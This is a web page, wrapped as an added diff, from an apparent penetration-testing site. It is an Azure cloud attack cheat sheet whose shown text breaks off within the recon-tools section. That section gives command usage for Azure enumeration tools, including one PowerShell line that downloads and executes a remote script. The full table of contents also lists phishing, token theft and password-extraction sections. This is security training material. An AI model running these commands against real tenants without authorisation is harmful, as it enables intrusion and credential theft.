@@ -1,0 +1,2201 @@
+<!DOCTYPE html>
+<html lang="en" dir="ltr">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="description" content="Tips, tricks, techniques and methodologies for penetration testing against Microsoft Azure.">
+<meta name="theme-color" content="#FFFFFF">
+<meta name="color-scheme" content="light dark"><meta property="og:title" content="Microsoft&#39;s Azure Cloud" />
+<meta property="og:description" content="Tips, tricks, techniques and methodologies for penetration testing against Microsoft Azure." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://www.grayhatfreelancing.com/docs/microsoft_azure_cloud/" /><meta property="article:section" content="docs" />
+<meta property="article:published_time" content="2022-11-03T00:00:00+00:00" />
+<meta property="article:modified_time" content="2022-11-03T00:00:00+00:00" />
+<title>Microsoft&#39;s Azure Cloud | Gray Hat Freelancing</title>
+<link rel="manifest" href="/manifest.json">
+<link rel="icon" href="/favicon.png" type="image/x-icon">
+<link rel="stylesheet" href="/book.min.4b35fed0bea034bbc19c89c71e14b73fb9c68cfcc586b9382adfb9b7b103ba06.css" integrity="sha256-SzX&#43;0L6gNLvBnInHHhS3P7nGjPzFhrk4Kt&#43;5t7EDugY=" crossorigin="anonymous">
+  <script defer src="/flexsearch.min.js"></script>
+  <script defer src="/en.search.min.d50fea2a76ff11c274e36eee7c462453fa589bda1ed7236d45eaf1c9b25c1336.js" integrity="sha256-1Q/qKnb/EcJ0427ufEYkU/pYm9oe1yNtRerxybJcEzY=" crossorigin="anonymous"></script>
+
+  <script defer src="/sw.min.6f6f90fcb8eb1c49ec389838e6b801d0de19430b8e516902f8d75c3c8bd98739.js" integrity="sha256-b2&#43;Q/LjrHEnsOJg45rgB0N4ZQwuOUWkC&#43;NdcPIvZhzk=" crossorigin="anonymous"></script>
+
+<script type="application/javascript">
+var doNotTrack = false;
+if (!doNotTrack) {
+	(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+	(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+	m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+	})(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
+	ga('create', 'UA-124168691-2', 'auto');
+	
+	ga('send', 'pageview');
+}
+</script><!--
+Made with Book Theme
+https://github.com/alex-shpak/hugo-book
+-->
+  
+</head>
+<body dir="ltr">
+  <input type="checkbox" class="hidden toggle" id="menu-control" />
+  <input type="checkbox" class="hidden toggle" id="toc-control" />
+  <main class="container flex">
+    <aside class="book-menu">
+      <div class="book-menu-content">
+        
+  <nav>
+<h2 class="book-brand">
+  <a class="flex align-center" href="/"><img src="/logo.png" alt="Logo" /><span>Gray Hat Freelancing</span>
+  </a>
+</h2>
+
+
+<div class="book-search">
+  <input type="text" id="book-search-input" placeholder="Search" aria-label="Search" maxlength="64" data-hotkeys="s/" />
+  <div class="book-search-spinner hidden"></div>
+  <ul id="book-search-results"></ul>
+</div>
+
+
+
+  
+
+
+
+  
+    
+  
+    
+  
+
+
+
+<ul class="book-languages">
+  <li>
+    <input type="checkbox" id="languages" class="toggle" />
+    <label for="languages" class="flex justify-between">
+      <a role="button" class="flex align-center">
+        <img src="/svg/translate.svg" class="book-icon" alt="Languages" />
+        English
+      </a>
+    </label>
+
+    <ul>
+      
+      <li>
+        <a href="https://www.grayhatfreelancing.com/ru/">
+          Russian
+        </a>
+      </li>
+      
+      <li>
+        <a href="https://www.grayhatfreelancing.com/zh/">
+          Chinese
+        </a>
+      </li>
+      
+    </ul>
+  </li>
+</ul>
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+  
+  <ul>
+    
+      
+        <li class="book-section-flat" >
+          
+  
+  
+
+  
+    <a href="/docs/example/" class="">Example Site</a>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/example/table-of-contents/" class="">Table of Contents</a>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/example/table-of-contents/with-toc/" class="">With ToC</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/example/table-of-contents/without-toc/" class="">Without ToC</a>
+  
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <input type="checkbox" id="section-4e46b01272d410b3a99461d79326ddf4" class="toggle"  />
+    <label for="section-4e46b01272d410b3a99461d79326ddf4" class="flex justify-between">
+      <a role="button" class="">Collapsed</a>
+    </label>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/example/collapsed/3rd-level/" class="">3rd Level</a>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/example/collapsed/3rd-level/4th-level/" class="">4th Level</a>
+  
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/attacking_active_directory/" class="">Active Directory Attacks</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/bind_shell_cheatsheet/" class="">Bind Shell Cheatsheet</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/cobalt_strike_all_you_need/" class="">Cobalt Strike</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/microsoft_azure_cloud/" class="active">Microsoft&#39;s Azure Cloud</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/docker_pentesting/" class="">Docker Security</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/csv_injection/" class="">Csv Injection</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/checking_for_account_takeover/" class="">Account Takeovers</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/amazon_aws_s3_buckets/" class="">Amazon AWS S3 Buckets</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/api_key_leaks/" class="">API Key Leaks</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/command_injection/" class="">Command Injection</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/cors_misconfigurations/" class="">CORS Misconfigurations</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/crlf_injection/" class="">CRLF Injection</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/csrf_injection/" class="">CSRF Injection</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/cve_exploits/" class="">CVE Exploits</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/dependency_confusion_attacks/" class="">Dependency Confusion</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/file_inclusion/" class="">File Inclusion</a>
+  
+
+        </li>
+      
+    
+      
+        <li class="book-section-flat" >
+          
+  
+  
+
+  
+    <span>Shortcodes</span>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/shortcodes/buttons/" class="">Buttons</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/shortcodes/columns/" class="">Columns</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/shortcodes/details/" class="">Details</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/shortcodes/expand/" class="">Expand</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/shortcodes/hints/" class="">Hints</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/shortcodes/katex/" class="">Katex</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/shortcodes/mermaid/" class="">Mermaid</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <input type="checkbox" id="section-d3fc1bf6d66cd84b896a0af9f40cb1d5" class="toggle"  />
+    <label for="section-d3fc1bf6d66cd84b896a0af9f40cb1d5" class="flex justify-between">
+      <a href="/docs/shortcodes/section/" class="">Section</a>
+    </label>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/shortcodes/section/first-page/" class="">First Page</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/shortcodes/section/second-page/" class="">Second Page</a>
+  
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/shortcodes/tabs/" class="">Tabs</a>
+  
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/directory_traversal/" class="">Directory Traversal</a>
+  
+
+        </li>
+      
+    
+  </ul>
+
+
+
+
+
+
+
+
+
+
+
+  
+<ul>
+  
+  <li>
+    <a href="/posts/"  >
+        Blog
+      </a>
+  </li>
+  
+  <li>
+    <a href="https://github.com/m00tiny/"  target="_blank" rel="noopener">
+        Github
+      </a>
+  </li>
+  
+  <li>
+    <a href="https://github.com/m00tiny/grayhatfreelancing"  target="_blank" rel="noopener">
+        Contribute
+      </a>
+  </li>
+  
+</ul>
+
+
+
+
+
+
+</nav>
+
+
+
+
+  <script>(function(){var e=document.querySelector("aside .book-menu-content");addEventListener("beforeunload",function(){localStorage.setItem("menu.scrollTop",e.scrollTop)}),e.scrollTop=localStorage.getItem("menu.scrollTop")})()</script>
+
+
+ 
+      </div>
+    </aside>
+
+    <div class="book-page">
+      <header class="book-header">
+        
+  <div class="flex align-center justify-between">
+  <label for="menu-control">
+    <img src="/svg/menu.svg" class="book-icon" alt="Menu" />
+  </label>
+
+  <strong>Microsoft&#39;s Azure Cloud</strong>
+
+  <label for="toc-control">
+    
+    <img src="/svg/toc.svg" class="book-icon" alt="Table of Contents" />
+    
+  </label>
+</div>
+
+
+  
+  <aside class="hidden clearfix">
+    
+  
+<nav id="TableOfContents">
+  <ul>
+    <li><a href="#cloud---azure">Cloud - Azure</a>
+      <ul>
+        <li><a href="#azure-recon-tools">Azure Recon Tools</a></li>
+        <li><a href="#terminology">Terminology</a></li>
+        <li><a href="#enumeration">Enumeration</a>
+          <ul>
+            <li><a href="#enumerate-valid-emails">Enumerate valid emails</a></li>
+            <li><a href="#enumerate-azure-subdomains">Enumerate Azure Subdomains</a></li>
+            <li><a href="#enumerate-tenant-with-azure-ad-powershell">Enumerate tenant with Azure AD Powershell</a></li>
+            <li><a href="#enumerate-tenant-with-az-powershell">Enumerate tenant with Az Powershell</a></li>
+            <li><a href="#enumerate-tenant-with-az-cli">Enumerate tenant with az cli</a></li>
+            <li><a href="#enumerate-manually">Enumerate manually</a></li>
+          </ul>
+        </li>
+        <li><a href="#enumeration-methodology">Enumeration methodology</a></li>
+        <li><a href="#phishing-with-evilginx2">Phishing with Evilginx2</a></li>
+        <li><a href="#illicit-consent-grant">Illicit Consent Grant</a>
+          <ul>
+            <li><a href="#register-application">Register Application</a></li>
+            <li><a href="#configure-application">Configure Application</a></li>
+            <li><a href="#setup-365-stealer-deprecated">Setup 365-Stealer (Deprecated)</a></li>
+            <li><a href="#setup-vajra">Setup Vajra</a></li>
+          </ul>
+        </li>
+        <li><a href="#device-code-phish">Device Code Phish</a></li>
+        <li><a href="#token-from-managed-identity">Token from Managed Identity</a>
+          <ul>
+            <li><a href="#azure-api-via-powershell">Azure API via Powershell</a></li>
+            <li><a href="#azure-api-via-python-version">Azure API via Python Version</a></li>
+            <li><a href="#get-tokens">Get Tokens</a></li>
+            <li><a href="#use-tokens">Use Tokens</a></li>
+            <li><a href="#refresh-tokens">Refresh Tokens</a></li>
+          </ul>
+        </li>
+        <li><a href="#stealing-tokens">Stealing Tokens</a>
+          <ul>
+            <li><a href="#stealing-tokens-from-az-cli">Stealing tokens from az cli</a></li>
+            <li><a href="#stealing-tokens-from-az-powershell">Stealing tokens from az powershell</a></li>
+          </ul>
+        </li>
+        <li><a href="#add-credentials-to-all-enterprise-applications">Add credentials to all Enterprise Applications</a></li>
+        <li><a href="#spawn-ssh-for-azure-web-app">Spawn SSH for Azure Web App</a></li>
+        <li><a href="#azure-storage-blob">Azure Storage Blob</a>
+          <ul>
+            <li><a href="#enumerate-blobs">Enumerate blobs</a></li>
+            <li><a href="#sas-url">SAS URL</a></li>
+            <li><a href="#list-and-download-blobs">List and download blobs</a></li>
+          </ul>
+        </li>
+        <li><a href="#runbook-automation">Runbook Automation</a>
+          <ul>
+            <li><a href="#create-a-runbook">Create a Runbook</a></li>
+            <li><a href="#persistence-via-automation-accounts">Persistence via Automation accounts</a></li>
+          </ul>
+        </li>
+        <li><a href="#virtual-machine-runcommand">Virtual Machine RunCommand</a></li>
+        <li><a href="#keyvault-secrets">KeyVault Secrets</a></li>
+        <li><a href="#pass-the-prt">Pass The PRT</a></li>
+        <li><a href="#pass-the-certificate">Pass The Certificate</a></li>
+        <li><a href="#intunes-administration">Intunes Administration</a></li>
+        <li><a href="#dynamic-group-membership">Dynamic Group Membership</a></li>
+        <li><a href="#administrative-unit">Administrative Unit</a></li>
+        <li><a href="#deployment-template">Deployment Template</a></li>
+        <li><a href="#application-proxy">Application Proxy</a></li>
+        <li><a href="#conditional-access">Conditional Access</a></li>
+        <li><a href="#azure-ad">Azure AD</a>
+          <ul>
+            <li><a href="#azure-ad-vs-active-directory">Azure AD vs Active Directory</a></li>
+            <li><a href="#password-spray">Password Spray</a></li>
+            <li><a href="#convert-guid-to-sid">Convert GUID to SID</a></li>
+          </ul>
+        </li>
+        <li><a href="#azure-ad-connect">Azure AD Connect</a>
+          <ul>
+            <li><a href="#azure-ad-connect---password-extraction">Azure AD Connect - Password extraction</a></li>
+            <li><a href="#azure-ad-connect---msol-accounts-password-and-dcsync">Azure AD Connect - MSOL Account&rsquo;s password and DCSync</a></li>
+            <li><a href="#azure-ad-connect---seamless-single-sign-on-silver-ticket">Azure AD Connect - Seamless Single Sign On Silver Ticket</a></li>
+          </ul>
+        </li>
+        <li><a href="#references">References</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+
+
+
+  </aside>
+  
+ 
+      </header>
+
+      
+      
+  <article class="markdown"><h1 id="cloud---azure">
+  Cloud - Azure
+  <a class="anchor" href="#cloud---azure">#</a>
+</h1>
+<h2 id="azure-recon-tools">
+  Azure Recon Tools
+  <a class="anchor" href="#azure-recon-tools">#</a>
+</h2>
+<ul>
+<li>
+<p>
+  <a href="https://github.com/dirkjanm/ROADtools"><strong>ROADTool</strong></a> - The Azure AD exploration framework.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>pipenv shell
+</span></span><span style="display:flex;"><span>roadrecon auth [-h] [-u USERNAME] [-p PASSWORD] [-t TENANT] [-c CLIENT] [-<span style="color:#f92672">-as</span>-app] [--device-code] [--access-token ACCESS_TOKEN] [--refresh-token REFRESH_TOKEN] [<span style="color:#f92672">-f</span> TOKENFILE] [--tokens-stdout]
+</span></span><span style="display:flex;"><span>roadrecon gather [-h] [-d DATABASE] [<span style="color:#f92672">-f</span> TOKENFILE] [--tokens-stdin] [--mfa]
+</span></span><span style="display:flex;"><span>roadrecon auth -u test@&lt;TENANT NAME&gt;.onmicrosoft.com -p &lt;PASSWORD&gt;
+</span></span><span style="display:flex;"><span>roadrecon gather
+</span></span><span style="display:flex;"><span>roadrecon gui
+</span></span></code></pre></div></li>
+<li>
+<p>
+  <a href="https://github.com/Azure/Stormspotter"><strong>Azure/StormSpotter</strong></a> - Azure Red Team tool for graphing Azure and Azure Active Directory objects</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span><span style="color:#75715e"># session 1 - backend</span>
+</span></span><span style="display:flex;"><span>pipenv shell
+</span></span><span style="display:flex;"><span>python ssbackend.pyz
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># session 2 - frontend</span>
+</span></span><span style="display:flex;"><span>cd C:\Tools\stormspotter\frontend\dist\spa\
+</span></span><span style="display:flex;"><span>quasar.cmd serve -p <span style="color:#ae81ff">9091</span> --history
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># session 3 - collector</span>
+</span></span><span style="display:flex;"><span>pipenv shell
+</span></span><span style="display:flex;"><span>az login -u test@&lt;TENANT NAME&gt;.onmicrosoft.com -p &lt;PASSWORD&gt;
+</span></span><span style="display:flex;"><span>python C:\Tools\stormspotter\stormcollector\sscollector.pyz cli
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Web access on http://localhost:9091</span>
+</span></span><span style="display:flex;"><span>Username<span style="color:#960050;background-color:#1e0010">:</span> neo4j
+</span></span><span style="display:flex;"><span>Password<span style="color:#960050;background-color:#1e0010">:</span> BloodHound
+</span></span><span style="display:flex;"><span>Server<span style="color:#960050;background-color:#1e0010">:</span> bolt<span style="color:#960050;background-color:#1e0010">:</span>//localhost<span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">7687</span>
+</span></span></code></pre></div></li>
+<li>
+<p>
+  <a href="https://github.com/BloodHoundAD/AzureHound"><strong>BloodHoundAD/AzureHound</strong></a> - Azure Data Exporter for BloodHound</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>./azurehound configure
+</span></span><span style="display:flex;"><span>./azurehound -u <span style="color:#e6db74">&#34;MattNelson@contoso.onmicrosoft.com&#34;</span> -p <span style="color:#e6db74">&#34;MyVerySecurePassword123&#34;</span> --tenant <span style="color:#e6db74">&#34;contoso.onmicrosoft.com&#34;</span> list
+</span></span><span style="display:flex;"><span>./azurehound -u <span style="color:#e6db74">&#34;phisheduser@contoso.onmicrosoft.com&#34;</span> -p <span style="color:#e6db74">&#34;Password1&#34;</span> list -o initial-scan.json --tenant <span style="color:#e6db74">&#34;contoso.onmicrosoft.com&#34;</span>
+</span></span><span style="display:flex;"><span>./azurehound -a <span style="color:#e6db74">&#34;6b5adee8-...&#34;</span> -s <span style="color:#e6db74">&#34;&lt;secret&gt;&#34;</span> --tenant <span style="color:#e6db74">&#34;contoso.onmicrosoft.com&#34;</span> list
+</span></span><span style="display:flex;"><span>./azurehound -j <span style="color:#e6db74">&#34;ey...&#34;</span> --tenant <span style="color:#e6db74">&#34;contoso.onmicrosoft.com&#34;</span> list az-ad
+</span></span><span style="display:flex;"><span>./azurehound -r <span style="color:#e6db74">&#34;0.ARwA6Wg...&#34;</span> --tenant <span style="color:#e6db74">&#34;contoso.onmicrosoft.com&#34;</span> list users
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># List of collections</span>
+</span></span><span style="display:flex;"><span>az-ad<span style="color:#960050;background-color:#1e0010">:</span> Collect all information available at the AzureAD tenant level. <span style="color:#66d9ef">In</span> most tenants, all users have the ability to read all this information by <span style="color:#66d9ef">default</span>.
+</span></span><span style="display:flex;"><span>az-rm<span style="color:#960050;background-color:#1e0010">:</span> Collect all information available at the AzureRM subscription level. Users <span style="color:#66d9ef">do</span> not by <span style="color:#66d9ef">default</span> have read access to any of this information.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>apps<span style="color:#960050;background-color:#1e0010">:</span> Collects AzureAD application registration objects.
+</span></span><span style="display:flex;"><span>devices<span style="color:#960050;background-color:#1e0010">:</span> Collects AzureAD devices regardless of join type.
+</span></span><span style="display:flex;"><span>groups<span style="color:#960050;background-color:#1e0010">:</span> Collects AzureAD security-enabled groups, both role eligible and non role eligible.
+</span></span><span style="display:flex;"><span>key-vaults<span style="color:#960050;background-color:#1e0010">:</span> Collects AzureRM key vaults.
+</span></span><span style="display:flex;"><span>management-groups<span style="color:#960050;background-color:#1e0010">:</span> Collects AzureRM management group objects
+</span></span><span style="display:flex;"><span>resource-groups<span style="color:#960050;background-color:#1e0010">:</span> Collects AzureRM resource group objects
+</span></span><span style="display:flex;"><span>roles<span style="color:#960050;background-color:#1e0010">:</span> Collects AzureAD admin role objects
+</span></span><span style="display:flex;"><span>service-principals<span style="color:#960050;background-color:#1e0010">:</span> Collects AzureAD service principals
+</span></span><span style="display:flex;"><span>subscriptions<span style="color:#960050;background-color:#1e0010">:</span> Collevts AzureRM subscriptions
+</span></span><span style="display:flex;"><span>tenants<span style="color:#960050;background-color:#1e0010">:</span> Collevts AzureAD tenant objects
+</span></span><span style="display:flex;"><span>users<span style="color:#960050;background-color:#1e0010">:</span> Collects AzureAD users, including any guest users <span style="color:#66d9ef">in</span> the target tenant.
+</span></span><span style="display:flex;"><span>virtual-machines<span style="color:#960050;background-color:#1e0010">:</span> Collects AzureRM virtual machines
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># GUI access</span>
+</span></span><span style="display:flex;"><span>bolt<span style="color:#960050;background-color:#1e0010">:</span>//localhost<span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">7687</span>
+</span></span><span style="display:flex;"><span>Username<span style="color:#960050;background-color:#1e0010">:</span> neo4j
+</span></span><span style="display:flex;"><span>Password<span style="color:#960050;background-color:#1e0010">:</span> BloodHound
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Custom Queries : https://hausec.com/2020/11/23/azurehound-cypher-cheatsheet/</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Cypher query examples:</span>
+</span></span><span style="display:flex;"><span>MATCH p = (n)-[<span style="color:#66d9ef">r</span>]-&gt;(g:AZKeyVault) <span style="color:#66d9ef">RETURN</span> p
+</span></span><span style="display:flex;"><span>MATCH (n) WHERE n.azname IS NOT NULL AND n.azname &lt;&gt; <span style="color:#e6db74">&#34;&#34;</span> AND n.name IS NULL SET n.name = n.azname
+</span></span></code></pre></div></li>
+<li>
+<p>
+  <a href="https://github.com/BloodHoundAD/BARK">BloodHoundAD/BARK</a> - BloodHound Attack Research Kit</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ps1" data-lang="ps1"><span style="display:flex;"><span>. .\BARK.ps1
+</span></span><span style="display:flex;"><span>$MyRefreshTokenRequest = Get-AZRefreshTokenWithUsernamePassword -username <span style="color:#e6db74">&#34;user@contoso.onmicrosoft.com&#34;</span> -password <span style="color:#e6db74">&#34;MyVeryCoolPassword&#34;</span> -TenantID <span style="color:#e6db74">&#34;contoso.onmicrosoft.com&#34;</span>
+</span></span><span style="display:flex;"><span>$MyMSGraphToken = Get-MSGraphTokenWithRefreshToken -RefreshToken $MyRefreshTokenRequest.refresh_token -TenantID <span style="color:#e6db74">&#34;contoso.onmicrosoft.com&#34;</span>
+</span></span><span style="display:flex;"><span>$MyAADUsers = Get-AllAzureADUsers -Token $MyMSGraphToken.access_token -ShowProgress
+</span></span></code></pre></div></li>
+<li>
+<p>
+  <a href="https://msportals.io/"><strong>Microsoft Portals</strong></a> - Microsoft Administrator Sites</p>
+</li>
+<li>
+<p>
+  <a href="https://github.com/nccgroup/azucar.git"><strong>nccgroup/Azucar</strong></a> : Azucar automatically gathers a variety of configuration data and analyses all data relating to a particular subscription in order to determine security risks.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span><span style="color:#75715e"># You should use an account with at least read-permission on the assets you want to access</span>
+</span></span><span style="display:flex;"><span>PS&gt; Get-ChildItem -Recurse c:\Azucar_V10 | Unblock-File
+</span></span><span style="display:flex;"><span>PS&gt; .\Azucar.ps1 -AuthMode UseCachedCredentials -Verbose -WriteLog -Debug -ExportTo PRINT
+</span></span><span style="display:flex;"><span>PS&gt; .\Azucar.ps1 -ExportTo CSV,JSON,XML,EXCEL -AuthMode Certificate_Credentials -Certificate C:\AzucarTest\server.pfx -ApplicationId <span style="color:#ae81ff">00000000</span>-<span style="color:#ae81ff">0000</span>-<span style="color:#ae81ff">0000</span>-<span style="color:#ae81ff">0000</span>-<span style="color:#ae81ff">000000000000</span> -TenantID <span style="color:#ae81ff">00000000</span>-<span style="color:#ae81ff">0000</span>-<span style="color:#ae81ff">0000</span>-<span style="color:#ae81ff">0000</span>-<span style="color:#ae81ff">000000000000</span>
+</span></span><span style="display:flex;"><span>PS&gt; .\Azucar.ps1 -ExportTo CSV,JSON,XML,EXCEL -AuthMode Certificate_Credentials -Certificate C:\AzucarTest\server.pfx -CertFilePassword MySuperP@ssw0rd! -ApplicationId <span style="color:#ae81ff">00000000</span>-<span style="color:#ae81ff">0000</span>-<span style="color:#ae81ff">0000</span>-<span style="color:#ae81ff">0000</span>-<span style="color:#ae81ff">000000000000</span> -TenantID <span style="color:#ae81ff">00000000</span>-<span style="color:#ae81ff">0000</span>-<span style="color:#ae81ff">0000</span>-<span style="color:#ae81ff">0000</span>-<span style="color:#ae81ff">000000000000</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># resolve the TenantID for an specific username</span>
+</span></span><span style="display:flex;"><span>PS&gt; .\Azucar.ps1 -ResolveTenantUserName user@company.com
+</span></span></code></pre></div></li>
+<li>
+<p>
+  <a href="https://github.com/FSecureLABS/Azurite"><strong>FSecureLABS/Azurite Explorer</strong></a> and <strong>Azurite Visualizer</strong> : Enumeration and reconnaissance activities in the Microsoft Azure Cloud.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>git submodule init
+</span></span><span style="display:flex;"><span>git submodule update
+</span></span><span style="display:flex;"><span>PS&gt; Import-Module AzureRM
+</span></span><span style="display:flex;"><span>PS&gt; Import-Module AzuriteExplorer.ps1
+</span></span><span style="display:flex;"><span>PS&gt; Review-AzureRmSubscription
+</span></span><span style="display:flex;"><span>PS&gt; Review-CustomAzureRmSubscription
+</span></span></code></pre></div></li>
+<li>
+<p>
+  <a href="https://github.com/NetSPI/MicroBurst"><strong>NetSPI/MicroBurst</strong></a> - MicroBurst includes functions and scripts that support Azure Services discovery, weak configuration auditing, and post exploitation actions such as credential dumping</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>PS C:&gt; Import-Module .\MicroBurst.psm1
+</span></span><span style="display:flex;"><span>PS C:&gt; Import-Module .\Get-AzureDomainInfo.ps1
+</span></span><span style="display:flex;"><span>PS C:&gt; Get-AzureDomainInfo -folder MicroBurst -Verbose
+</span></span></code></pre></div></li>
+<li>
+<p>
+  <a href="https://github.com/cyberark/SkyArk"><strong>cyberark/SkyArk</strong></a> - Discover the most privileged users in the scanned Azure environment - including the Azure Shadow Admins.<br>
+Require:</p>
+<ul>
+<li>Read-Only permissions over Azure Directory (Tenant)</li>
+<li>Read-Only permissions over Subscription</li>
+<li>Require AZ and AzureAD module or administrator right</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>$ powershell -ExecutionPolicy Bypass -NoProfile
+</span></span><span style="display:flex;"><span>PS C&gt; Import-Module .\SkyArk.ps1 -force
+</span></span><span style="display:flex;"><span>PS C&gt; Start-AzureStealth
+</span></span><span style="display:flex;"><span>PS C&gt; IEX (New-Object Net.WebClient).DownloadString(<span style="color:#e6db74">&#39;https://raw.githubusercontent.com/cyberark/SkyArk/master/AzureStealth/AzureStealth.ps1&#39;</span>)  
+</span></span><span style="display:flex;"><span>PS C&gt; Scan-AzureAdmins  
+</span></span></code></pre></div></li>
+<li>
+<p>
+  <a href="https://github.com/hausec/PowerZure"><strong>hausec/PowerZure</strong></a> - PowerShell framework to assess Azure security</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span><span style="color:#75715e"># Require az module !</span>
+</span></span><span style="display:flex;"><span>$ ipmo .\PowerZure
+</span></span><span style="display:flex;"><span>$ Set-Subscription -Id [<span style="color:#66d9ef">idgoeshere</span>]
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Reader</span>
